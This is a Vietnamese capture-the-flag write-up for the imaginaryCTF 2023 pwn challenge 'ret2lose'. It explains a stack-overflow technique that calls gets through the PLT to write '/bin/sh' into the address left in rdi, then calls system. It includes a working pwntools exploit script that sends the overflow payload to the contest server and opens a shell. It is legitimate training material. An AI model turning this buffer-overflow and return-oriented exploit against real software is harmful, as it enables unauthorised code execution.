# RET2LOSE

## Mô tả

- Mô tả challenge.
</br>![img](/imaginaryCTF%202023/Pwn/ret2lose/assets/des.png)

- Bài cho chúng ta 2 file tương tự như bài [ret2win](/imaginaryCTF%202023/Pwn/ret2win/README.md), tuy nhiên đề bài yêu cầu ta phải lấy được shell.

- Các thông tin về lớp bảo vệ file code thì i nguyên như bài ret2win.

- Thường những bài lấy shell ở 64-bit mình sẽ cần một hoặc một vài ROPgadget để set cho thanh ghi rdi, nhưng bài này khi mình sử dụng lệnh tìm thì không thấy cái nào có ích cả. Hơn nữa phần .plt cũng chả có hàm nào ngoài gets với system. Do đó, bài này khiến mình mất khá nhiều thời gian suy nghĩ để cho ra ý tưởng.

## Ý tưởng

- Như vậy là vấn đề ở đây là làm thế nào để có thể set được thanh ghi rdi trong khi chả có cái gadget nào liên quan đến nó.

- Cách giải quyết là ta sẽ không cần dùng đến gadget nào, mà sẽ set cho vùng nhớ của địa chỉ trong thanh ghi rdi bằng một chuỗi nào đó, xong rồi ta sẽ gọi hàm system để thực hiện với đối số ta vừa ghi vào vùng nhớ trong địa chỉ mà rdi đang chứa.

- Để thực hiện được điều đó thì mình đầu tiên kiểm tra xem khi chương trình thực hiện đến lệnh ret của hàm main thì rdi sẽ chứa địa chỉ có thể đọc và ghi hay không?, nếu có thì ta sẽ ghi đè RET của hàm main bằng địa chỉ trong plt của gets, sau đó sẽ ghi đè một vài cái gadget ret để hàm system không bị sigsegv do stack alignment.

- Tiến hành kiểm tra xem rdi khi tới lệnh ret của hàm main thì sẽ có dịa chỉ như nào?
</br>![img](/imaginaryCTF%202023/Pwn/ret2lose/assets/check.png)

- Hay, vậy là rdi chứa một địa chỉ có cho phép đọc và ghi. Như vậy là cách bên trên là có khả năng thực hiện được.

- Sau khi đã send được payload đến được server, thì chương trình ở server sẽ chạy hàm gets, khi đó ta có thể nhập chuỗi "/bin/sh" chẳng hạn, khi đấy chương trình sẽ thực hiện system("/bin/sh") và ta có được shell.

## Script

- Trên thực tế thì đúng là ta đã thực hiện được cách khai thác bên trên, chỉ có điều sau khi ta nhập được chuỗi xong thì chuỗi đó sẽ bị thay đổi một chút, cụ thể là ở ô nhớ thứ 4 trong chuỗi sẽ bị giảm đi 1 đơn vị, do đó mình đã tăng 1 đơn vị cho kí tự ở vị trí đó (từ / thành 0) do đó khi mình nhập xong chuỗi "/bin0sh" thì sau lệnh gets ta sẽ có chuỗi "/bin/sh".

```python
from pwn import *

p = remote("ret2win.chal.imaginaryctf.org", 1337)
#elf = ELF("./vuln")
#p = elf.process()
#gdb.attach(p)

# install ROPgadget to use shell script command: ROPgadget --binary chal 

ret = 0x40101a

# take from .plt
gets = 0x401060
system = 0x401050

payload = b"a"*0x48 + p64(ret) + p64(gets) + p64(ret) + p64(system)
p.sendline(payload)
p.sendline(b"/bin0sh")
p.interactive()
```

## Kết quả

![img](/imaginaryCTF%202023/Pwn/ret2lose/assets/res.png)

> Flag: ictf{ret2libc?_what_libc?}